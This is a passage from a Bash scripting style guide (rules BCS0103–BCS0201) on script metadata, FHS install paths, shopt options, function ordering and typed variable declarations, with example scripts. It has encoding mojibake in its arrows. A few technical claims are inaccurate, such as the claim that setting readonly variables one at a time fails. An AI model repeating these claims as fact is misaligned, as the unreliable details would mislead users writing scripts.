- **Resource Location**: SCRIPT_DIR enables reliable loading of companion files, libraries, and configuration
- **Logging/Error Messages**: SCRIPT_NAME provides consistent script identification in output
- **Defensive Programming**: readonly prevents accidental modification that could break resource loading
- **Consistency**: Standard metadata works identically across all scripts, reducing cognitive load

**Standard metadata pattern:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script metadata - immediately after shopt
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Rest of script follows
```

**Metadata variables:**

**1. VERSION** - Semantic version (Major.Minor.Patch format)
- Used for: `--version` output, logging, deployment tracking
```bash
VERSION='1.0.0'
info "Starting $SCRIPT_NAME $VERSION"
```

**2. SCRIPT_PATH** - Absolute canonical path to script file
- Command: `realpath -- "$0"`
  - `--`: Prevents option injection if filename starts with `-`
  - Fails if file doesn't exist (intentional - catches errors early)
  - Loadable builtin available for maximum performance
```bash
SCRIPT_PATH=$(realpath -- "$0")
# Examples: /usr/local/bin/myapp, /home/user/projects/app/deploy.sh
debug "Running from: $SCRIPT_PATH"
```

**3. SCRIPT_DIR** - Directory containing the script
- Derivation: `${SCRIPT_PATH%/*}` removes last `/` and everything after
```bash
SCRIPT_DIR=${SCRIPT_PATH%/*}
# If SCRIPT_PATH=/usr/local/bin/myapp, then SCRIPT_DIR=/usr/local/bin

# Load library from same directory
source "$SCRIPT_DIR/lib/common.sh"

# Read configuration from relative path
config_file="$SCRIPT_DIR/../conf/app.conf"
```

**4. SCRIPT_NAME** - Base name (filename only, no path)
- Derivation: `${SCRIPT_PATH##*/}` removes everything up to last `/`
```bash
SCRIPT_NAME=${SCRIPT_PATH##*/}
# If SCRIPT_PATH=/usr/local/bin/myapp, then SCRIPT_NAME=myapp

# Use in error messages
die() {
  local -i exit_code=$1
  shift
  >&2 echo "$SCRIPT_NAME: error: $*"
  exit "$exit_code"
}
```

**Why readonly as a group:**

```bash
#  Correct - make readonly together after all assignments
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# This pattern:
# 1. Groups related declarations visibly
# 2. Makes intent clear (these are immutable metadata)
# 3. Prevents accidental reassignment anywhere in script
```

**Using metadata for resource location:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Load libraries relative to script location
source "$SCRIPT_DIR/lib/logging.sh"

# Load configuration
declare -- config_file="$SCRIPT_DIR/../etc/app.conf"
[[ -f "$config_file" ]] && source "$config_file"

# Access data files
declare -- data_dir="$SCRIPT_DIR/../share/data"
[[ -d "$data_dir" ]] || die 2 "Data directory not found: $data_dir"

# Use metadata in logging
info "Starting $SCRIPT_NAME $VERSION"
debug "Script location: $SCRIPT_PATH"
```

**Why realpath over readlink:**

```bash
# realpath is the canonical BCS approach because:
# 1. Simpler syntax: No -e/-n flags needed (default behavior is correct)
# 2. Builtin available: Loadable builtin provides maximum performance
# 3. Widely available: Standard on modern Linux systems
# 4. POSIX compliant: realpath is in POSIX, readlink is GNU-specific
# 5. Consistent behavior: Fails if file doesn't exist (catches errors early)

#  Correct - use realpath
SCRIPT_PATH=$(realpath -- "$0")

#  Avoid - readlink requires -en flags (more complex, GNU-specific)
SCRIPT_PATH=$(readlink -en -- "$0")

# For maximum performance, load realpath as builtin:
# enable -f /usr/local/lib/bash-builtins/realpath.so realpath
```

**Anti-patterns:**

```bash
#  Wrong - using $0 directly without realpath
SCRIPT_PATH="$0"  # Could be relative path or symlink!

#  Correct - resolve with realpath
SCRIPT_PATH=$(realpath -- "$0")

#  Wrong - using dirname and basename (requires external commands)
SCRIPT_DIR=$(dirname "$0")
SCRIPT_NAME=$(basename "$0")

#  Correct - use parameter expansion (faster, more reliable)
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}

#  Wrong - using PWD for script directory
SCRIPT_DIR="$PWD"  # Wrong! This is current working directory, not script location

#  Correct - derive from SCRIPT_PATH
SCRIPT_DIR=${SCRIPT_PATH%/*}

#  Wrong - making readonly individually
readonly VERSION='1.0.0'
readonly SCRIPT_PATH=$(realpath -- "$0")
readonly SCRIPT_DIR=${SCRIPT_PATH%/*}  # Can't assign to readonly variable!

#  Correct - assign first, then make readonly as group
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR

#  Wrong - using inconsistent variable names
SCRIPT_VERSION='1.0.0'  # Should be VERSION
SCRIPT_DIRECTORY="$SCRIPT_DIR"  # Redundant
MY_SCRIPT_PATH="$SCRIPT_PATH"  # Non-standard

#  Correct - use standard names
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}

#  Wrong - declaring metadata late in script
# ... 50 lines of code ...
VERSION='1.0.0'  # Too late! Should be near top

#  Correct - declare immediately after shopt
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
VERSION='1.0.0'  # Right after shopt
```

**Edge cases:**

```bash
# Edge case 1: Script in root directory
SCRIPT_PATH='/myscript'
SCRIPT_DIR=${SCRIPT_PATH%/*}  # Results in empty string!

# Solution: Handle edge case
SCRIPT_DIR=${SCRIPT_PATH%/*}
[[ -z "$SCRIPT_DIR" ]] && SCRIPT_DIR='/'
readonly -- SCRIPT_DIR

# Edge case 2: Sourced vs executed
# When sourced, $0 is the calling shell, not the script
if [[ "${BASH_SOURCE[0]}" != "$0" ]]; then
  # Script is being sourced
  SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
else
  # Script is being executed
  SCRIPT_PATH=$(realpath -- "$0")
fi

SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script metadata
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Global variables
declare -- LOG_FILE="$SCRIPT_DIR/../logs/$SCRIPT_NAME.log"
declare -- CONFIG_FILE="$SCRIPT_DIR/../etc/$SCRIPT_NAME.conf"

# Messaging functions
info() {
  echo "[$SCRIPT_NAME] $*" | tee -a "$LOG_FILE"
}

die() {
  local -i exit_code=$1
  shift
  >&2 echo "[$SCRIPT_NAME] ERROR: $*" | tee -a "$LOG_FILE"
  exit "$exit_code"
}

# Show version
show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

# Show help with script name
show_help() {
  cat << EOF
Usage: $SCRIPT_NAME [OPTIONS]

Process data according to configuration.

Options:
  -h, --help     Show this help message
  -V, --version  Show version information

Version: $VERSION
Location: $SCRIPT_PATH
EOF
}

# Load configuration from script directory
load_config() {
  if [[ -f "$CONFIG_FILE" ]]; then
    info "Loading configuration from $CONFIG_FILE"
    source "$CONFIG_FILE"
  else
    die 2 "Configuration file not found: $CONFIG_FILE"
  fi
}

main() {
  info "Starting $SCRIPT_NAME $VERSION"
  info "Running from: $SCRIPT_PATH"

  load_config

  # Main logic here
  info 'Processing complete'
}

main "$@"

#fin
```

**Summary:**

- **Always declare metadata** immediately after `shopt` settings
- **Use standard names**: VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME
- **Use realpath** to resolve SCRIPT_PATH (canonical BCS approach)
- **Derive SCRIPT_DIR and SCRIPT_NAME** from SCRIPT_PATH using parameter expansion
- **Make readonly as a group** after all assignments
- **Use metadata** for resource location, logging, error messages, version display
- **Handle edge cases**: root directory, sourced scripts
- **Performance**: Consider loading realpath as builtin for maximum speed


---


**Rule: BCS0104**

## Filesystem Hierarchy Standard (FHS) Preference

**When designing scripts that install files or search for resources, follow the Filesystem Hierarchy Standard (FHS) where practical. FHS compliance enables predictable file locations, supports both system and user installations, and integrates smoothly with package managers.**

**Rationale:**

- **Predictability**: Standard locations (`/usr/local/bin/`, `/usr/share/`) expected by users and package managers
- **Multi-Environment Support**: Works in development, local/system/user install scenarios without modification
- **Package Manager Compatibility**: Seamless integration with apt, yum, pacman
- **Portability**: Cross-distribution compatibility, no hardcoded paths

**Common FHS locations:**
- `/usr/local/bin/`, `/usr/local/share/`, `/usr/local/lib/`, `/usr/local/etc/` - User-installed files (system-wide, not package-managed)
- `/usr/bin/`, `/usr/share/` - System executables/data (package-managed)
- `$HOME/.local/bin/`, `$HOME/.local/share/` - User-specific files
- `${XDG_CONFIG_HOME:-$HOME/.config}/` - User-specific configuration

**When FHS is useful:**
- Installation scripts placing files in standard locations
- Scripts searching for data files in multiple locations
- Projects supporting system-wide and user-specific installation
- Multi-system distribution expecting standard paths

**FHS search pattern:**
```bash
find_data_file() {
  local -- script_dir="$1"
  local -- filename="$2"
  local -a search_paths=(
    "$script_dir"/"$filename"  # Development
    /usr/local/share/myapp/"$filename" # Local install
    /usr/share/myapp/"$filename" # System install
    "${XDG_DATA_HOME:-$HOME/.local/share}/myapp/$filename"  # User install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; }
  done

  return 1
}
```

**Installation script pattern:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# PREFIX customization
declare -- PREFIX="${PREFIX:-/usr/local}"
declare -- BIN_DIR="$PREFIX/bin"
declare -- SHARE_DIR="$PREFIX/share/myapp"
declare -- LIB_DIR="$PREFIX/lib/myapp"
declare -- ETC_DIR="$PREFIX/etc/myapp"
declare -- MAN_DIR="$PREFIX/share/man/man1"
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR ETC_DIR MAN_DIR

install_files() {
  install -d "$BIN_DIR" "$SHARE_DIR" "$LIB_DIR" "$ETC_DIR" "$MAN_DIR"
  install -m 755 "$SCRIPT_DIR/myapp" "$BIN_DIR/myapp"
  install -m 644 "$SCRIPT_DIR/data/template.txt" "$SHARE_DIR/template.txt"
  install -m 644 "$SCRIPT_DIR/lib/common.sh" "$LIB_DIR/common.sh"

  # Preserve existing config
  [[ -f "$ETC_DIR/myapp.conf" ]] || \
    install -m 644 "$SCRIPT_DIR/myapp.conf.example" "$ETC_DIR/myapp.conf"

  install -m 644 "$SCRIPT_DIR/docs/myapp.1" "$MAN_DIR/myapp.1"
  info "Installation complete to $PREFIX"
}

uninstall_files() {
  rm -f "$BIN_DIR/myapp" "$SHARE_DIR/template.txt" "$LIB_DIR/common.sh" "$MAN_DIR/myapp.1"
  rmdir --ignore-fail-on-non-empty "$SHARE_DIR" "$LIB_DIR" "$ETC_DIR"
  info "Uninstallation complete"
}

main() {
  case "${1:-install}" in
    install)   install_files ;;
    uninstall) uninstall_files ;;
    *)         die 2 "Usage: $SCRIPT_NAME {install|uninstall}" ;;
  esac
}

main "$@"

#fin
```

**Resource loading with FHS search:**

```bash
# Find data file
find_data_file() {
  local -- filename="$1"
  local -a search_paths=(
    "$SCRIPT_DIR/$filename"  # Development
    "/usr/local/share/myapp/$filename"  # Local install
    "/usr/share/myapp/$filename"  # System install
    "${XDG_DATA_HOME:-$HOME/.local/share}/myapp/$filename"  # User install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; }
  done

  die 2 "Data file not found: $filename"
}

# Find config file (XDG priority)
find_config_file() {
  local -- filename="$1"
  local -a search_paths=(
    "${XDG_CONFIG_HOME:-$HOME/.config}/myapp/$filename"  # User config (highest priority)
    "/usr/local/etc/myapp/$filename"  # Local config
    "/etc/myapp/$filename"  # System config
    "$SCRIPT_DIR/$filename"  # Development fallback
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; }
  done

  return 1  # Config optional
}

# Load library
load_library() {
  local -- lib_name="$1"
  local -a search_paths=(
    "$SCRIPT_DIR/lib/$lib_name"  # Development
    "/usr/local/lib/myapp/$lib_name"  # Local install
    "/usr/lib/myapp/$lib_name"  # System install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { source "$path"; return 0; }
  done

  die 2 "Library not found: $lib_name"
}
```

**Makefile pattern:**

```bash
# Makefile
PREFIX ?= /usr/local
BINDIR = $(PREFIX)/bin
SHAREDIR = $(PREFIX)/share/myapp
MANDIR = $(PREFIX)/share/man/man1

install:
	install -d $(BINDIR) $(SHAREDIR) $(MANDIR)
	install -m 755 myapp $(BINDIR)/myapp
	install -m 644 data/template.txt $(SHAREDIR)/template.txt
	install -m 644 docs/myapp.1 $(MANDIR)/myapp.1

uninstall:
	rm -f $(BINDIR)/myapp $(SHAREDIR)/template.txt $(MANDIR)/myapp.1

# Usage:
# make install                       # /usr/local
# make PREFIX=/usr install           # /usr
# make PREFIX=$HOME/.local install   # User install
```

**XDG Base Directory Specification:**

```bash
# XDG variables with fallbacks
declare -- XDG_DATA_HOME="${XDG_DATA_HOME:-$HOME/.local/share}"
declare -- XDG_CONFIG_HOME="${XDG_CONFIG_HOME:-$HOME/.config}"
declare -- XDG_CACHE_HOME="${XDG_CACHE_HOME:-$HOME/.cache}"
declare -- XDG_STATE_HOME="${XDG_STATE_HOME:-$HOME/.local/state}"

# Application directories
declare -- USER_DATA_DIR="$XDG_DATA_HOME/myapp"
declare -- USER_CONFIG_DIR="$XDG_CONFIG_HOME/myapp"
declare -- USER_CACHE_DIR="$XDG_CACHE_HOME/myapp"
declare -- USER_STATE_DIR="$XDG_STATE_HOME/myapp"

install -d "$USER_DATA_DIR" "$USER_CONFIG_DIR" "$USER_CACHE_DIR" "$USER_STATE_DIR"
```

**Anti-patterns:**

```bash
#  Wrong - hardcoded absolute path
data_file='/home/user/projects/myapp/data/template.txt'

#  Correct - FHS search pattern
data_file=$(find_data_file 'template.txt')

#  Wrong - assuming specific install location
source /usr/local/lib/myapp/common.sh

#  Correct - search multiple FHS locations
load_library 'common.sh'

#  Wrong - relative paths from CWD (breaks when run from different directory)
source ../lib/common.sh

#  Correct - paths relative to script location
source "$SCRIPT_DIR/../lib/common.sh"

#  Wrong - hardcoded PREFIX
BIN_DIR=/usr/local/bin

#  Correct - respect PREFIX environment variable
PREFIX="${PREFIX:-/usr/local}"
BIN_DIR="$PREFIX/bin"

#  Wrong - mixing executables and data
install myapp /opt/myapp/
install template.txt /opt/myapp/

#  Correct - separate by FHS hierarchy
install myapp "$PREFIX/bin/"
install template.txt "$PREFIX/share/myapp/"

#  Wrong - overwriting user config on upgrade
install myapp.conf "$PREFIX/etc/myapp/myapp.conf"

#  Correct - preserve existing config
[[ -f "$PREFIX/etc/myapp/myapp.conf" ]] || \
  install myapp.conf.example "$PREFIX/etc/myapp/myapp.conf"
```

**Edge cases:**

**1. PREFIX with trailing slash:**
```bash
PREFIX="${PREFIX:-/usr/local}"
PREFIX="${PREFIX%/}"  # Remove trailing slash if present
BIN_DIR="$PREFIX/bin"
```

**2. Permission check:**
```bash
if [[ ! -w "$PREFIX" ]]; then
  warn "No write permission to $PREFIX"
  info "Try: PREFIX=\$HOME/.local make install"
  die 5 'Permission denied'
fi
```

**3. Symlink resolution:**
```bash
# realpath resolves symlinks to actual installation directory
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
# SCRIPT_DIR now points to real location, not symlink location
```

**When NOT to use FHS:**

- Single-user scripts only used by one user
- Project-specific tools (build scripts, test runners staying in project directory)
- Container applications (Docker using app-specific paths like `/app`)
- Embedded systems with custom layouts

**Summary:**

Follow FHS for system-wide/distributed scripts. Use PREFIX for custom locations. Search multiple locations (development, local, system, user). Separate file types by hierarchy (bin/, share/, etc/, lib/). Support XDG for user files. Preserve user config on upgrades. Make PREFIX customizable via environment variable.


---


**Rule: BCS0105**

## shopt

**Recommended settings:**

```bash
# STRONGLY RECOMMENDED
shopt -s inherit_errexit  # Makes set -e work in subshells/command substitutions
shopt -s shift_verbose    # Catches shift errors when no arguments remain
shopt -s extglob          # Enables extended glob patterns like !(*.txt)

# CHOOSE ONE:
shopt -s nullglob   # For arrays/loops: unmatched globs ’ empty (no error)
                # OR
shopt -s failglob   # For strict scripts: unmatched globs ’ error

# OPTIONAL:
shopt -s globstar   # Enable ** for recursive matching (slow on deep trees)
```

**Rationale:**

**`inherit_errexit` (CRITICAL):** Without it, `set -e` does NOT apply inside command substitutions or subshells. With it, errors in `$(...)` and `(...)` properly propagate.

```bash
set -e  # Without inherit_errexit
result=$(false)  # Does NOT exit!

shopt -s inherit_errexit
result=$(false)  # Script exits as expected
```

**`shift_verbose`:** Without it, `shift` silently fails when no arguments remain. With it, prints error respecting `set -e`.

**`extglob`:** Enables advanced patterns: `?(pattern)`, `*(pattern)`, `+(pattern)`, `@(pattern)`, `!(pattern)`.

```bash
rm !(*.txt)                           # Delete everything except .txt
cp *.@(jpg|png|gif) /destination/     # Multiple extensions
[[ $input == +([0-9]) ]] && echo "Number"  # One or more digits
```

**`nullglob` vs `failglob`:**

- **nullglob**: Best for file processing loops/arrays. Unmatched glob expands to empty string.
```bash
for file in *.txt; do echo "$file"; done  # Loop skipped if no matches
files=(*.log)  # Empty array if no matches
```

- **failglob**: Best for strict scripts where unmatched glob indicates error.
```bash
cat *.conf  # Error if no .conf files (exits with set -e)
```

- **Default (neither)**: Dangerous - unmatched glob becomes literal string `"*.txt"`.

**`globstar` (OPTIONAL):** Enables `**` for recursive matching. Can be slow on deep trees.

```bash
for script in **/*.sh; do shellcheck "$script"; done  # Recursive find
```

**Typical configuration:**
```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
```

**When NOT to use:** Interactive scripts (lenient behavior preferred), legacy compatibility (older bash versions), performance-critical with `globstar` on large trees.


---


**Rule: BCS0106**

## File Extensions
- Executables: `.sh` extension or no extension
- Libraries: Must have `.sh` extension, should not be executable
- Dual-purpose (library + executable): `.sh` or no extension
- Global PATH executables: Always omit extension


---


**Rule: BCS0107**

## Function Organization

**Always organize functions bottom-up: lowest-level primitives first (messaging, utilities), then composition layers, ending with `main()` as the highest-level orchestrator. This eliminates forward reference issues and makes scripts readable and maintainable.**

**Rationale:**

- **No Forward References**: Bash reads top-to-bottom; dependency order ensures all called functions exist before use
- **Readability & Debugging**: Readers understand primitives first, then compositions; dependencies are immediately visible
- **Maintainability & Testability**: Clear hierarchy; low-level functions tested independently
- **Cognitive Load**: Understanding small pieces first reduces mental overhead

**Standard 7-layer pattern:**

```bash
#!/bin/bash
set -euo pipefail

# 1. Messaging functions (lowest level - used by everything)
_msg() { ... }
success() { >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
info() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

# 2. Documentation functions (no dependencies)
show_help() { ... }

# 3. Helper/utility functions (used by validation and business logic)
yn() { ... }
noarg() { ... }

# 4. Validation functions (check prerequisites, dependencies)
check_root() { ... }
check_prerequisites() { ... }

# 5. Business logic functions (domain-specific operations)
build_standalone() { ... }
install_standalone() { ... }
install_completions() { ... }

# 6. Orchestration/flow functions
show_completion_message() { ... }

# 7. Main function (highest level - orchestrates everything)
main() {
  check_root
  check_prerequisites

  if ((UNINSTALL)); then
    uninstall_files
    return 0
  fi

  build_standalone
  install_standalone
  install_completions
  show_completion_message
}

main "$@"
#fin
```

**Key principle:** Each function can safely call functions defined ABOVE it. Dependencies flow downward: higher functions call lower functions, never upward.

```
Top â†’ [Layer 1: Messaging] â† primitives
    â†“ [Layer 2: Documentation] â† calls Layer 1
    â†“ [Layer 3: Utilities] â† calls 1-2
    â†“ [Layer 4: Validation] â† calls 1-3
    â†“ [Layer 5: Business Logic] â† calls 1-4
    â†“ [Layer 6: Orchestration] â† calls 1-5
    â†“ [Layer 7: main()] â† calls all
    â†“ main "$@"
    â†’ #fin
```

**Layer descriptions:**

1. **Messaging** - `_msg()`, `info()`, `warn()`, `error()`, `die()`, `success()`, `debug()`, `vecho()` - Pure I/O, no dependencies
2. **Documentation** - `show_help()`, `show_version()`, `show_usage()` - Help text, may use messaging
3. **Helper/utilities** - `yn()`, `noarg()`, `trim()`, `s()`, `decp()` - Generic utilities
4. **Validation** - `check_root()`, `check_prerequisites()`, `validate_input()` - Verify preconditions
5. **Business logic** - `build_project()`, `process_file()`, `deploy_app()` - Core functionality
6. **Orchestration** - `run_build_phase()`, `run_deploy_phase()`, `cleanup()` - Coordinates business logic
7. **main()** - Top-level flow, calls any function

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -i VERBOSE=0 DRY_RUN=0
declare -- BUILD_DIR='/tmp/build'

# Layer 1: Messaging
_msg() { local -- func="${FUNCNAME[1]}"; echo "[$func] $*"; }
info() { >&2 _msg "$@"; }
warn() { >&2 _msg "WARNING: $*"; }
error() { >&2 _msg "ERROR: $*"; }
die() { local -i exit_code=$1; shift; (($#)) && error "$@"; exit "$exit_code"; }
success() { >&2 _msg "SUCCESS: $*"; }
debug() { ((VERBOSE)) && >&2 _msg "DEBUG: $*"; return 0; }

# Layer 2: Documentation
show_version() { echo "$SCRIPT_NAME $VERSION"; }
show_help() {
  cat << EOF
Usage: $SCRIPT_NAME [OPTIONS]
Build and deploy application.

Options:
  -v, --verbose   Verbose output
  -n, --dry-run   Dry-run mode
  -h, --help      Show help
  -V, --version   Show version
EOF
}

# Layer 3: Utilities
yn() {
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
noarg() { (($# < 2)) && die 2 "Option $1 requires an argument"; }

# Layer 4: Validation
check_prerequisites() {
  info 'Checking prerequisites...'
  local -- cmd
  for cmd in git make tar; do
    command -v "$cmd" >/dev/null 2>&1 || die 1 "Required command not found: $cmd"
  done
  [[ -w "${BUILD_DIR%/*}" ]] || die 5 "Cannot write to: $BUILD_DIR"
  success 'Prerequisites check passed'
}

validate_config() {
  info 'Validating configuration...'
  [[ -f 'config.conf' ]] || die 2 'Configuration file not found'
  source 'config.conf'
  [[ -n "${APP_NAME:-}" ]] || die 22 'APP_NAME not set'
  [[ -n "${APP_VERSION:-}" ]] || die 22 'APP_VERSION not set'
  debug "App: $APP_NAME $APP_VERSION"
  success 'Configuration validated'
}

# Layer 5: Business logic
clean_build_dir() {
  info "Cleaning: $BUILD_DIR"
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would remove build directory'
    return 0
  fi
  [[ -d "$BUILD_DIR" ]] && { rm -rf "$BUILD_DIR"; debug "Removed: $BUILD_DIR"; }
  install -d "$BUILD_DIR"
  success "Build directory ready"
}

compile_sources() {
  info 'Compiling sources...'
  ((DRY_RUN)) && { info '[DRY-RUN] Would compile'; return 0; }
  make -C src all BUILD_DIR="$BUILD_DIR"
  success 'Sources compiled'
}

run_tests() {
  info 'Running tests...'
  ((DRY_RUN)) && { info '[DRY-RUN] Would run tests'; return 0; }
  make -C tests all
  success 'Tests passed'
}

create_package() {
  info 'Creating package...'
  local -- package_file="$BUILD_DIR/app.tar.gz"
  ((DRY_RUN)) && { info "[DRY-RUN] Would create: $package_file"; return 0; }
  tar -czf "$package_file" -C "$BUILD_DIR" .
  success "Package created: $package_file"
}

# Layer 6: Orchestration
run_build_phase() {
  info 'Starting build phase...'
  clean_build_dir; compile_sources; run_tests
  success 'Build phase complete'
}

run_package_phase() {
  info 'Starting package phase...'
  create_package
  success 'Package phase complete'
}

# Layer 7: Main
main() {
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -h|--help)    show_help; exit 0 ;;
    -V|--version) show_version; exit 0 ;;
    -*)           die 22 "Invalid option: $1" ;;
    *)            die 2 "Unexpected argument: $1" ;;
  esac; shift; done

  readonly -- VERBOSE DRY_RUN
  info "Starting $SCRIPT_NAME $VERSION"
  ((DRY_RUN)) && info 'DRY-RUN MODE'

  check_prerequisites
  validate_config
  run_build_phase
  run_package_phase

  success "$SCRIPT_NAME completed"
}

main "$@"
#fin
```

**Critical anti-patterns:**

```bash
# âœ— Wrong - main() at top (forward references)
main() { build_project; }  # Not defined yet!
build_project() { ... }

# âœ“ Correct - main() at bottom
build_project() { ... }
main() { build_project; }

# âœ— Wrong - business logic before utilities
process_file() { validate_input "$1"; }  # Not defined yet!
validate_input() { ... }

# âœ“ Correct - utilities first
validate_input() { ... }
process_file() { validate_input "$1"; }

# âœ— Wrong - messaging scattered
info() { ... }
build() { ... }
warn() { ... }

# âœ“ Correct - all messaging together
info() { ... }
warn() { ... }
error() { ... }
build() { ... }

# âœ— Wrong - circular dependencies
function_a() { function_b; }
function_b() { function_a; }

# âœ“ Correct - extract common logic
common_logic() { ... }
function_a() { common_logic; }
function_b() { common_logic; }
```

**Within-layer ordering:**

- **Layer 1**: Severity order: `_msg()`, `info()`, `success()`, `debug()`, `warn()`, `error()`, `die()`
- **Layer 3**: Alphabetically or by frequency
- **Layer 4**: Execution sequence
- **Layer 5**: Logical workflow order

**Edge cases:**

**Circular dependencies:** Extract shared logic to lower layer
```bash
shared_validation() { ... }
function_a() { shared_validation; }
function_b() { shared_validation; }
```

**Sourced libraries:** Place after messaging layer
```bash
info() { ... }
warn() { ... }
source "$SCRIPT_DIR/lib/common.sh"
validate_email() { ... }
```

**Private functions:** Same layer as public users
```bash
_msg() { ... }  # Private
info() { >&2 _msg "$@"; }  # Public
```

**Summary:** Bottom-up organization (messaging â†’ utilities â†’ validation â†’ business logic â†’ orchestration â†’ main()) mirrors how programmers think. Dependencies flow downward. main() always last before invocation.


---


**Rule: BCS0200**

# Variable Declarations & Constants

This section establishes explicit variable declaration practices with type hints for clarity and safety. Covers type-specific declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`), variable scoping (global vs local), naming conventions (UPPER_CASE for constants, lower_case for variables), readonly patterns (individual and group), boolean flags using integers, and derived variables computed from other variables. These practices ensure predictable behavior and prevent common errors.


---


**Rule: BCS0201**

## Type-Specific Declarations

**Always use explicit type declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`) to make variable intent clear and enable type-safe operations.**

**Rationale:**

- **Type Safety & Error Prevention**: Integer declarations (`-i`) enforce numeric operations and catch non-numeric assignments; array declarations prevent scalar assignment bugs
- **Documentation**: Explicit types serve as inline documentation showing variable purpose
- **Performance**: Type-specific operations faster than string-based operations
- **Scope Control**: `declare` and `local` provide precise variable scoping

**Declaration Types:**

**1. Integer variables (`declare -i`)**

For variables holding only numeric values in arithmetic operations.

```bash
declare -i count=0
declare -i port=8080

# Automatic arithmetic evaluation
count=count+1  # Same as: ((count+=1))
count='5 + 3'  # Evaluates to 8, not string "5 + 3"

# Type enforcement
count='abc'  # Evaluates to 0 (non-numeric becomes 0)
```

**Use for**: Counters, loop indices, exit codes, port numbers, numeric flags

**2. String variables (`declare --`)**

For text strings. The `--` separator prevents option injection.

```bash
declare -- filename='data.txt'
declare -- user_input=''
declare -- var_name='-weird'  # Without --, this would be interpreted as option
```

**Use for**: File paths, user input, configuration values, text data

**3. Indexed arrays (`declare -a`)**

Ordered lists indexed by integers.

```bash
declare -a files=()
declare -a args=('one' 'two' 'three')

files+=('file1.txt')
files+=('file2.txt')

echo "${files[0]}"  # file1.txt
echo "${files[@]}"  # All elements
echo "${#files[@]}"  # Count: 2

for file in "${files[@]}"; do
  process "$file"
done
```

**Use for**: Lists of items, command arrays, sequential collections

**4. Associative arrays (`declare -A`)**

Key-value maps (requires Bash 4.0+).

```bash
declare -A config=(
  [app_name]='myapp'
  [app_port]='8080'
)

user_data[name]='Alice'

echo "${config[app_name]}"  # myapp
echo "${!config[@]}"  # All keys
echo "${config[@]}"  # All values

# Check if key exists
[[ -v "config[app_port]" ]] && echo "Port: ${config[app_port]}"

# Iterate
for key in "${!config[@]}"; do
  echo "$key = ${config[$key]}"
done
```

**Use for**: Configuration data, dynamic function dispatch, caching, data organized by named keys

**5. Read-only constants (`readonly --`)**

Variables that never change after initialization.

```bash
readonly -- VERSION='1.0.0'
readonly -i MAX_RETRIES=3
readonly -a ALLOWED_ACTIONS=('start' 'stop' 'restart')

VERSION='2.0.0'  # bash: VERSION: readonly variable
```

**Use for**: VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME, configuration constants, magic numbers/strings

